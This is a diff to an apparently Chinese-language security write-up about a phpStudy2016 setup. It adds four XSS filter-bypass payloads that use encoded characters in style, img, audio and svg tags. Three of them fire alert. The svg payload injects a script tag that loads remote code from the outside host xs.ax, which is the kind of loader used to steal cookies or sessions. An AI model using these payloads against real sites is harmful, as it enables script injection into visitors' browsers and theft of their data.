@@ -43,3 +43,10 @@ phpStudy2016(PHP-5.4.45+Apache)
 ```
 ![4](https://ae01.alicdn.com/kf/U3529497cee1f48e7b86ccedd924109a2B.png)
 
+给几个测试绕过的 `payload`
+```
+<style  %26%2362 onload=alert`1`>
+<img %26%2362 src=1  onerror=alert`1`>
+<audio %26%2362 src=x  onerror=alert`1`>
+<svg %26%2362 onload=appendChild(createElement('script')).src='//xs.ax/HfcB'>
+```
